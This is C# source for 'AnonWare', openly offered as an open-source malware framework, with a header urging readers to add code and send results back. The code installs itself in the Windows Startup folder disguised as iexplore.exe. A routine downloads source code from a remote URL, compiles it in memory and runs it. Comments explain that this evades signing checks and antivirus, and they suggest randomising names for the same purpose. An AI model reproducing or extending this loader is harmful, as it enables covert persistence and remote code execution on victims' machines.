///first, a little introduction might be neccessary!
///welcome to a new age of malware.
///one where AV software can't pick out the latest tweaks of malware
///one where the malware is open source and always chainging, improving, evading
///one where AnonWare is only the begining.
///you can stop anonware. but you can't stop what's to come.
///Expect Us. Expect the Future.
///~AnonDev
///PS: this is just a framework; not supposed to be a full-fledged virus ^_^ add your own code onto this and send the result to opendev@hushmail.com kthx


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using System.CodeDom.Compiler;
using System.Net;
using System.IO;

namespace AnonWare_CSharp
{
    class Program
    {
        static void Main()
        {
            string appdatapath = Environment.GetEnvironmentVariable("appdata").ToString();
            //when it starts, app checks whether or not it's set to run on startup
            if (File.Exists(appdatapath + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe")) //we're using iexplore.exe as our fake identity :P check in Properties -> assembly name 2 change it. keep in mind that XP might have a different startup folder than then Win 7 and Vista. this is the path for 7 and vista startup folder
            {
            }
            else
            {
                //if it isn't, do this
                File.Copy(AppDomain.CurrentDomain.FriendlyName.ToString(), appdatapath + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe");
            }
        }
        public static string watsdasource;
        static void compile()
        {
            //we're using runtime compilation instead of just downloading an exe to go around the whole program is not signed by msft shit
            try
            {
                CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
                ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
                String[] referenceAssemblies = { "System.dll" }; //if you plan to do more than really simple stuff with it, add stuff to this list (seperate them with commas)
                string myAssemblyName = "assemble.exe";
                CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
                myCompilerParameters.GenerateExecutable = true;
                myCompilerParameters.GenerateInMemory = true;
                WebClient x = new WebClient();
                Stream y = x.OpenRead("http://sumsite.com/sumfile.txt"); //link to txt file containing source code (nothing matters except that it's a text file, name it anything you want)
                StreamReader z = new StreamReader(y);
                string source = z.ReadToEnd();
                if (source != watsdasource)
                {
                    watsdasource = source;
                    z.Close();
                    y.Close();
                    CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, source);
                    Process.Start("assemble.exe"); //for AV purposes, it's recommended that you change the name of this, or even make the name self-creating (see 'for all your randomness needs' below) ^_^
                }
                else
                {
                    z.Close();
                    y.Close();
                }
            }
            catch
            {
                //uh oh...
            }
        }
        //for all your randomness needs! ^_^
        public static string GetPassword()
        {
            StringBuilder builder = new StringBuilder();
            builder.Append(RandomString(4, true));
            builder.Append(RandomNumber(1000, 9999));
            builder.Append(RandomString(2, false));
            return builder.ToString();
        }
        private static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        private static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }
    }
}
